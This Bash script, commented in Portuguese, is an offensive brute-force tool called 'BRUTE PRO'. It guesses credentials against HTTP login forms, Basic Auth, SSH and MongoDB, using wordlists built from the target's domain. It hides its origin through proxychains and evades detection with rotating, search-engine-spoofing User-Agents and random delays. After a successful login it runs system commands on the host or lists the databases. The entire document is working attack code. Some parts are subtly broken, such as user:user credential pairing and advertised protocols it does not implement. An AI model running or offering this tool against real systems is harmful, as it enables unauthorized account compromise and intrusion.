#!/bin/bash
# BRUTE PRO - Força bruta inteligente com evasão avançada
echo "=== BRUTE FORCE PRO - INTELLIGENT & EVASIVE ==="

TYPE="$1"
TARGET="$2"
THREADS="${3:-5}"

if [ -z "$TARGET" ]; then
    echo "Uso: $0 <TIPO> <TARGET> [THREADS]"
    echo "Tipos: ssh, ftp, http, mysql, mongo, rdp, smb"
    echo "Exemplo: $0 http https://example.com/login 8"
    exit 1
fi

TIMESTAMP=$(date +%s)
TEMP_DIR="/tmp/brute_pro_$TIMESTAMP"
mkdir -p "$TEMP_DIR"

echo "🎯 Target: $TARGET"
echo "🔧 Type: $TYPE"
echo "🧵 Threads: $THREADS"

# Wordlists inteligentes baseadas no alvo
generate_smart_wordlist() {
    local target="$1"
    local wordlist_file="$TEMP_DIR/smart_wordlist.txt"
    
    # Extrair informações do alvo
    domain=$(echo "$target" | sed 's|https\?://||' | cut -d'/' -f1 | cut -d':' -f1)
    company=$(echo "$domain" | cut -d'.' -f1)
    
    # Wordlist base
    cat > "$wordlist_file" <<EOF
admin
administrator
root
user
test
guest
demo
sa
postgres
mysql
$company
${company}123
${company}2024
${company}admin
admin$company
password
123456
password123
admin123
root123
toor
pass
test123
guest123
qwerty
letmein
welcome
login
default
changeme
secret
master
system
service
EOF
    
    # Adicionar variações do ano
    current_year=$(date +%Y)
    for year in $current_year $((current_year-1)) $((current_year-2)); do
        echo "${company}$year" >> "$wordlist_file"
        echo "admin$year" >> "$wordlist_file"
        echo "password$year" >> "$wordlist_file"
    done
    
    # Adicionar variações sazonais
    month=$(date +%m)
    case $month in
        12|01|02) echo "winter2024" >> "$wordlist_file" ;;
        03|04|05) echo "spring2024" >> "$wordlist_file" ;;
        06|07|08) echo "summer2024" >> "$wordlist_file" ;;
        09|10|11) echo "autumn2024" >> "$wordlist_file" ;;
    esac
    
    sort -u "$wordlist_file" -o "$wordlist_file"
    echo "📝 Wordlist inteligente gerada: $(wc -l < "$wordlist_file") entradas"
}

# Função de evasão - randomizar User-Agent e delays
get_random_ua() {
    local uas=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
        "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
    )
    echo "${uas[$RANDOM % ${#uas[@]}]}"
}

# Função para delay inteligente (evitar detecção)
smart_delay() {
    local base_delay="$1"
    local random_delay=$((RANDOM % 3 + 1))
    sleep $((base_delay + random_delay))
}

# Brute force HTTP inteligente
brute_http() {
    local url="$1"
    local wordlist="$2"
    local thread_id="$3"
    local output_file="$TEMP_DIR/http_thread_$thread_id.txt"
    
    echo "🌐 Thread $thread_id iniciada para HTTP" > "$output_file"
    
    while IFS=: read -r user pass; do
        ua=$(get_random_ua)
        
        # Tentar POST form
        response=$(proxychains4 -q curl -s -X POST "$url" \
            -H "User-Agent: $ua" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
            -d "username=$user&password=$pass&login=Login" \
            --connect-timeout 15 \
            -w "STATUS:%{http_code}|SIZE:%{size_download}|TIME:%{time_total}" 2>/dev/null)
        
        status=$(echo "$response" | grep -o "STATUS:[0-9]*" | cut -d: -f2)
        size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
        
        echo "[$thread_id] $user:$pass -> HTTP $status (${size}b)" >> "$output_file"
        
        # Análise inteligente da resposta
        if [ "$status" = "200" ] || [ "$status" = "302" ] || [ "$status" = "301" ]; then
            if echo "$response" | grep -qi "dashboard\\|welcome\\|admin\\|success\\|profile"; then
                echo "🎉 SUCESSO PROVÁVEL: $user:$pass (HTTP $status)" >> "$output_file"
                echo "🎉 HTTP SUCCESS: $user:$pass" >> "$TEMP_DIR/success.txt"
            elif [ "$size" -gt 1000 ]; then
                echo "🤔 RESPOSTA DIFERENTE: $user:$pass (${size}b)" >> "$output_file"
            fi
        fi
        
        # Tentar Basic Auth
        basic_status=$(proxychains4 -q curl -s -u "$user:$pass" -o /dev/null -w "%{http_code}" "$url" --connect-timeout 10)
        if [ "$basic_status" = "200" ]; then
            echo "🔐 BASIC AUTH SUCCESS: $user:$pass" >> "$output_file"
            echo "🔐 BASIC AUTH SUCCESS: $user:$pass" >> "$TEMP_DIR/success.txt"
        fi
        
        smart_delay 2
        
    done < <(paste -d: <(cut -d: -f1 "$wordlist") <(cut -d: -f1 "$wordlist"))
}

# Brute force SSH inteligente
brute_ssh() {
    local host="$1"
    local wordlist="$2"
    local thread_id="$3"
    local output_file="$TEMP_DIR/ssh_thread_$thread_id.txt"
    
    echo "🔑 Thread $thread_id iniciada para SSH" > "$output_file"
    
    while IFS=: read -r user pass; do
        echo "[$thread_id] Testando SSH: $user:$pass" >> "$output_file"
        
        # Usar sshpass com timeout
        result=$(timeout 15 proxychains4 -q sshpass -p "$pass" ssh -o ConnectTimeout=10 \
            -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
            "$user@$host" "echo SUCCESS_LOGIN" 2>/dev/null)
        
        if echo "$result" | grep -q "SUCCESS_LOGIN"; then
            echo "🎉 SSH SUCCESS: $user:$pass" >> "$output_file"
            echo "🎉 SSH SUCCESS: $user:$pass" >> "$TEMP_DIR/success.txt"
            
            # Tentar obter informações do sistema
            system_info=$(timeout 10 proxychains4 -q sshpass -p "$pass" ssh -o ConnectTimeout=5 \
                -o StrictHostKeyChecking=no "$user@$host" "uname -a; whoami; id" 2>/dev/null)
            echo "📋 System Info: $system_info" >> "$output_file"
        fi
        
        smart_delay 3
        
    done < <(paste -d: <(cut -d: -f1 "$wordlist") <(cut -d: -f1 "$wordlist"))
}

# Brute force MongoDB inteligente
brute_mongo() {
    local host="$1"
    local wordlist="$2"
    local thread_id="$3"
    local output_file="$TEMP_DIR/mongo_thread_$thread_id.txt"
    
    echo "🍃 Thread $thread_id iniciada para MongoDB" > "$output_file"
    
    # Primeiro testar sem autenticação
    echo "[$thread_id] Testando MongoDB sem auth..." >> "$output_file"
    if timeout 10 proxychains4 -q mongo "$host" --eval "db.version()" 2>/dev/null | grep -q "version"; then
        echo "🎉 MONGODB SEM AUTENTICAÇÃO!" >> "$output_file"
        echo "🎉 MONGODB NO AUTH: $host" >> "$TEMP_DIR/success.txt"
        
        # Tentar listar databases
        dbs=$(timeout 10 proxychains4 -q mongo "$host" --eval "db.adminCommand('listDatabases')" 2>/dev/null)
        echo "📋 Databases: $dbs" >> "$output_file"
        return
    fi
    
    # Brute force com credenciais
    while IFS=: read -r user pass; do
        echo "[$thread_id] Testando MongoDB: $user:$pass" >> "$output_file"
        
        result=$(timeout 15 proxychains4 -q mongo "$host" -u "$user" -p "$pass" \
            --eval "db.version()" 2>/dev/null)
        
        if echo "$result" | grep -q "version"; then
            echo "🎉 MONGODB SUCCESS: $user:$pass" >> "$output_file"
            echo "🎉 MONGODB SUCCESS: $user:$pass" >> "$TEMP_DIR/success.txt"
        fi
        
        smart_delay 2
        
    done < <(paste -d: <(cut -d: -f1 "$wordlist") <(cut -d: -f1 "$wordlist"))
}

# Gerar wordlist inteligente
generate_smart_wordlist "$TARGET"
WORDLIST="$TEMP_DIR/smart_wordlist.txt"

# Executar brute force baseado no tipo
echo -e "\n🚀 Iniciando brute force inteligente..."

case "$TYPE" in
    "http")
        echo "🌐 Brute force HTTP com $THREADS threads"
        for i in $(seq 1 $THREADS); do
            brute_http "$TARGET" "$WORDLIST" "$i" &
        done
        ;;
        
    "ssh")
        echo "🔑 Brute force SSH com $THREADS threads"
        for i in $(seq 1 $THREADS); do
            brute_ssh "$TARGET" "$WORDLIST" "$i" &
        done
        ;;
        
    "mongo")
        echo "🍃 Brute force MongoDB com $THREADS threads"
        for i in $(seq 1 $THREADS); do
            brute_mongo "$TARGET" "$WORDLIST" "$i" &
        done
        ;;
        
    *)
        echo "❌ Tipo não suportado: $TYPE"
        exit 1
        ;;
esac

# Aguardar todas as threads
wait

# Consolidar resultados
echo -e "\n📊 Consolidando resultados..."

SUCCESS_FILE="$TEMP_DIR/success.txt"
FINAL_REPORT="$TEMP_DIR/BRUTE_FORCE_REPORT.txt"

cat > "$FINAL_REPORT" <<EOF
BRUTE FORCE PRO - RELATÓRIO
===========================
Target: $TARGET
Type: $TYPE
Threads: $THREADS
Timestamp: $(date)
Wordlist: $(wc -l < "$WORDLIST") entradas

SUCESSOS ENCONTRADOS:
EOF

if [ -f "$SUCCESS_FILE" ]; then
    cat "$SUCCESS_FILE" >> "$FINAL_REPORT"
    success_count=$(wc -l < "$SUCCESS_FILE")
else
    echo "Nenhum sucesso encontrado" >> "$FINAL_REPORT"
    success_count=0
fi

echo -e "\nESTATÍSTICAS:" >> "$FINAL_REPORT"
echo "- Tentativas: $(wc -l < "$WORDLIST")" >> "$FINAL_REPORT"
echo "- Sucessos: $success_count" >> "$FINAL_REPORT"
echo "- Taxa de sucesso: $(( success_count * 100 / $(wc -l < "$WORDLIST") ))%" >> "$FINAL_REPORT"

# Mostrar resultado
echo -e "\n🎯 BRUTE FORCE CONCLUÍDO!"
cat "$FINAL_REPORT"

if [ $success_count -gt 0 ]; then
    echo -e "\n🎉 CREDENCIAIS ENCONTRADAS!"
    cat "$SUCCESS_FILE"
else
    echo -e "\n😞 Nenhuma credencial encontrada"
fi

echo -e "\n📁 Logs detalhados em: $TEMP_DIR"